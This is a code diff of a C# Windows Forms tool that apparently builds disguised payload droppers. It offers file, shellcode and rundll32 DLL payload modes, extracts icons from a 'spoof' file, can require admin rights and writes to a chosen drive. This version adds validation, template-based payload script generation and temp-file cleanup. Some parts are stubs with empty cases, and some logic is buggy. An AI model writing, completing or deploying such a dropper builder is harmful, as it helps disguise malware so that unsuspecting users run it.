@@ -11,12 +11,17 @@ using System.Drawing.IconLib;
 using System.Net;
 //using System.Runtime.InteropServices;
 
+/*
+ * TODO:
+ *      - Clean up the temporary files.
+ */
+
 namespace masamangalternatibo {
 
     public partial class Form1 : Form {
         public Form1() { InitializeComponent(); }
 
-        string version = "0.6.0a";
+        string version = "0.7.0a";
         int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
         string[] payloadData = new string[6]; //Stores the data from the textbox so the user can switch modes without losing the last settings Index 0-2: Stores the mode data // Index 3-4: Stores the arguments // Index 5: argument placeholder for shell mode (opposed for efficiency rather than doing heavy math and comparisons)
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
@@ -134,8 +139,12 @@ namespace masamangalternatibo {
                     this.Width = Convert.ToInt32(con[1]);
                     break;
 
+                case "cleanup":
+                    cleanup();
+                    break;
+
                 default:
-                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncls\nexit\n");
+                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\ncls\nexit\n");
                     break;
             }
             tbConsole.Text = "";
@@ -223,7 +232,7 @@ namespace masamangalternatibo {
             }
             else {
                 if (fromButton) {
-                    MessageBox.Show("No spoof file imported or Icon Library functions can't be utilized", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+                    MessageBox.Show("No spoof file imported or Icon Library functions can't be utilized", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 }
                 else {
                     dbgmsg("Error from un-intended extraction suppressed!");
@@ -232,20 +241,23 @@ namespace masamangalternatibo {
         }
 
         /*
-         Trim Extension Function - Removes the file extension from a string.
+         Trim Extension Function - Separates the file name to its extension
          -------------------------------------------------------------------
          trimexit(
-                String to trim
+                File name (string)
          )
          -------------------------------------------------------------------
-         *returns: string (Trimmed input)
+         *returns: string
+         *         Index 0: File Name
+         *         Index 1: File Extension
         */
-        private string trimext(string flname) {
+        private string[] trimext(string flname) {
             string[] aa = flname.Split('.');
-            string tmp = "";
-            for (int x = 0; x <= aa.Count() - 2; x++) {
-                tmp += "." + aa[x];
+            string[] tmp = new string[2];
+            foreach(string x in aa) {
+                tmp[0] += "." + x;
             }
+            tmp[1] = aa[aa.Count() - 1];
             return tmp;
         }
 
@@ -288,38 +300,125 @@ namespace masamangalternatibo {
          Open Miniature Notepad Function - a function to open the MiniPad Window
          --------------------------------------------------------------------------
          openminipad(
-                Script edit write mode (bool)
+                string to pass to mprtb (string),
+                Enable Pass to shell button (bool),
+                Enable Build button (bool)
          )
          --------------------------------------------------------------------------
          *Two or more instances uses the same code with small change of detail.
          *returns: nothing
         */
-        private void openminipad(bool writemode = false) {
+        private void openminipad(string writetb = "", bool enaPass = false, bool enaBuild = false) {
             using (minipad _minipad = new minipad()) {
                 _minipad.btnPassShell.Enabled = false;
                 _minipad.btnCompileScript.Enabled = false;
-                if (payloadMode == 2) { _minipad.btnPassShell.Enabled = true; }
-                if (writemode) { _minipad.btnCompileScript.Enabled = true; _minipad.btnPassShell.Enabled = false; }
+                if (enaPass) { _minipad.btnPassShell.Enabled = true; }
+                if (enaBuild) { _minipad.btnCompileScript.Enabled = true;}
+                _minipad.mprtb.Text = writetb;
                 _minipad.ShowDialog();
             }
         }
-       
+
         /*
         Validate Input Function - a function that validates the user input and checks if anything is missing or mistaken before generating the script.
         -----------------------------------------------------------------------------------------------------------------------------------------------
+         validateInput(
+                Is in write mode (bool)
+         )
+        -----------------------------------------------------------------------------------------------------------------------------------------------
         *returns: nothing
        */
-        private void validateInput() {
+        private void validateInput(bool isWriteMode) {
+            dbgmsg("Validating input...");
+            if (tbPayload.Text == "") {
+                MessageBox.Show("Payload is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+            if (tbSpoof.Text == "") {
+                MessageBox.Show("Spoof is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            if (payloadMode == 1) {
+                if (tbArguments.Text == "") {
+                    MessageBox.Show("DLL payload arguments is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return;
+                }
+            }
+
+            if (drpDrives.Items.Count < 1) {
+                MessageBox.Show("No drives detected!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            if (Directory.Exists(drpDrives.SelectedItem.ToString()) == false) { 
+                MessageBox.Show("Target drive doesn't exist!\n\nDrive: " + drpDrives.SelectedItem.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+            startBuild(isWriteMode);
+        }
+
+        /*
+        Generate Script Function - a function that generates the payload script with corresponding code from the options provided by the user.
+        ---------------------------------------------------------------------------------------------------------------------------------------
+         generateScript(
+                Is in write mode (bool)
+         )
+        ---------------------------------------------------------------------------------------------------------------------------------------
+        *returns: nothing
+        */
+        private void startBuild(bool isWriteMode) {
+            dbgmsg("Starting build...");
+            dbgmsg("Importing template...");
+
+            string templateData = File.ReadAllText("payloadTemplate.txt");
+
+            if (payloadMode != 2) {
+                dbgmsg("Importing payload...");
+                if (File.Exists("$payloadtmp")) {
+                    File.Delete("$payloadtmp");
+                }
+                File.Copy(payloadFile[payloadMode], "$payloadtmp");
+            }
+
+            dbgmsg("Importing spoofed file...");
+            if (File.Exists("$spooftmp")) {
+                File.Delete("$spooftmp");
+            }
+            File.Copy(ofdSpoof.FileName, "$spooftmp");
+
+            dbgmsg("Writing common sections...");
+            templateData = String.Format(templateData, (chkAdminFlag.Checked ? "#RequireAdmin" : ""), "", "", "", "", "", "", "", "", "", payloadMode);
+            switch (payloadMode) {
+                case 0:
+                    break;
+                case 1:
+                    break;
+                case 2:
+                    break;
+            }
+
+            if (isWriteMode) {
+                openminipad(templateData, false, true);
+            }
 
         }
 
         /*
-         Generate Script Function - a function that generates the payload script with corresponding code from the options provided by the user.
-         ---------------------------------------------------------------------------------------------------------------------------------------
-         *returns: nothing
-        */
-        private void generateScript() {
-           
+         * Clean up function - A function to be called to remove temporary files
+         *                   - Deletes all the files that starts with a dollar sign ($)
+         */
+        private void cleanup() {
+            dbgmsg("Cleaning up temporary files...");
+            foreach (string i in Directory.GetFiles(apth)) {
+                string b = i.Replace(apth + "\\", "");
+                char x = b[0];
+                if (x == '$') {
+                    dbgmsg("Deleting: " + b);
+                    File.Delete(i);
+                }
+            }
+            dbgmsg("Finished!");
         }
 
         /*
@@ -480,11 +579,21 @@ namespace masamangalternatibo {
         }
 
         private void btnMiniPad_Click(object sender, EventArgs e) {
-            openminipad();
+            if (payloadMode == 2) {
+                openminipad(tbPayload.Text, true, false);
+            }
+            else {
+                openminipad("", false, false);
+            }
+            
         }
 
         private void btnWrite_Click(object sender, EventArgs e) {
-            openminipad(true);
+            validateInput(true);
+        }
+
+        private void btnBuild_Click(object sender, EventArgs e) {
+            validateInput(false);
         }
     }
 }
